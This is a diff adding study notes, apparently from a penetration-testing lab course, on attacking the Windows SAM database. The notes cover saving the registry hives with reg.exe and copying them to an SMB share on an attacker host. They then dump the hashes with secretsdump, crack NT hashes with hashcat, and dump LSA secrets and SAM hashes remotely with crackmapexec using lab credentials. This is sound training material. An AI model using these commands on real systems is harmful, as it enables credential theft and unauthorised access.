@@ -430,9 +430,79 @@ Default credentials can also be found in the product documentation, as they cont
 
 In addition to application default credentials, there are [lists](https://www.softwaretestinghelp.com/default-router-username-and-password-list/) available specifically for routers. However, it's less common for router default credentials to remain unchanged since administrators usually prioritize securing these central network interfaces.
 
+# Attacking SAM
 
+With access to a non-domain joined Windows system, we may benefit from attempting to quickly dump the files associated with the SAM database to transfer them to our attack host and start cracking hashes offline. 
 
+## Copying SAM Registry Hives
 
+There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. 
 
+![image](https://github.com/user-attachments/assets/77ba71ad-a7f8-45a1-bad4-105e7cbb0bc4)
 
+### Using reg.exe save to Copy Registry Hives
+```
+reg.exe save hklm\sam C:\sam.save
+```
+```
+reg.exe save hklm\system C:\system.save
+```
+```
+reg.exe save hklm\security C:\security.save
+```
+Technically we will only need hklm\sam & hklm\system, but hklm\security can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts. Once the hives are saved offline, we can use various methods to transfer them to our attack host. 
+### Creating a Share with smbserver.py
+All we must do to create the share is run smbserver.py -smb2support using python, give the share a name (CompData) and specify the directory on our attack host where the share will be storing the hive copies (/home/ltnbob/Documents). 
+```
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
+```
 
+use move command to move copies to share
+
+### Moving Hive Copies to Share
+
+```
+move sam.save \\10.10.15.16\CompData
+```
+
+## Dumping Hashes with Impacket's secretsdump.py
+ tool we can use to dump the hashes offline is Impacket's secretsdump.py
+
+ ### Locating secretsdump.py
+ ```
+locate secretsdump
+```
+### Running secretsdump.py
+```
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+```
+Secretsdump successfully dumps the local SAM hashes and would've also dumped the cached domain logon information if the target was domain-joined and had cached credentials present in hklm\security. Notice the first step secretsdump executes is targeting the system bootkey before proceeding to dump the LOCAL SAM hashes. It cannot dump those hashes without the boot key because that boot key is used to encrypt & decrypt the SAM database.
+
+Most modern Windows operating systems store the password as an NT hash. Operating systems older than Windows Vista & Windows Server 2008 store passwords as an LM hash, so we may only benefit from cracking those if our target is an older Windows OS.
+
+## Cracking Hashes with Hashcat
+
+### Adding nthashes to a .txt File
+```
+sudo vim hashestocrack.txt
+```
+### Running Hashcat against NT Hashes
+Selecting a mode is largely dependent on the type of attack and hash type we want to crack. We will focus on using -m to select the hash type 1000 to crack our NT hashes. (use hashcat page to find other hash types and their number)
+```
+ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
+```
+We can see from the output that Hashcat used a type of attack called a dictionary attack to rapidly guess the passwords utilizing a list of known passwords (rockyou.txt) and was successful in cracking 3 of the hashes.  It is very common for people to re-use passwords across different work & personal accounts.
+
+### Remote Dumping & LSA Secrets Considerations
+With access to credentials with local admin privileges, it is also possible for us to target LSA Secrets over the network. This could allow us to extract credentials from a running service, scheduled task, or application that uses LSA secrets to store passwords.
+
+**Dumping LSA Secrets Remotely**
+
+```
+crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+```
+**Dumping SAM Remotely**
+
+```
+crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
+```
